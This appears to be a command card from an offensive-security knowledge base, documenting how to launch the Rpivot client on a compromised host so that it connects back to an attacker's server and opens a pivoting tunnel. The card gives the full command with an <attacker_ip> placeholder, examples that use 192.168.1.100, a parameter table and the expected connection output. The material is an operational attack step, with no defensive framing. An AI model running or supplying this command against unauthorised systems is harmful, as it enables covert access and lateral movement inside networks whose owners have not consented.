---
id: a920f540-f576-4357-8c6c-aa96326a6919
type: command
executor: bash
data: python client.py --server-ip <attacker_ip> --server-port 9443
output: null
created_at: '2023-04-06T03:56:22.866866+00:00'
updated_at: '2023-04-10T20:25:21.419917+00:00'
platforms:
  - Linux
  - Windows
tags:
  - pivoting
  - client
verified: true
validated: true
---

# rpivot-start-client

## Command

```bash
python client.py --server-ip <attacker_ip> --server-port 9443
```

## Description

Launches the Rpivot client on a compromised host to connect directly to the attacker's server, establishing a basic pivoting tunnel without proxy authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --server-ip <attacker_ip> | IP address of the attacker's Rpivot server | Yes |
| --server-port 9443 | Port on which the server is listening | Yes |

## Examples

### Basic Usage

```bash
python client.py --server-ip 192.168.1.100 --server-port 9443
```

### Advanced Usage

With custom port:
```bash
python client.py --server-ip 192.168.1.100 --server-port 9445
```

## Expected Output

Client logs showing connection success:
```
Connecting to server 192.168.1.100:9443
Connection established
Ready for proxy traffic
```
TCP connection confirmed without authentication errors.

## Related

- [[procedures/Rpivot-Network-Pivoting]]
- [[commands/rpivot-start-server]]
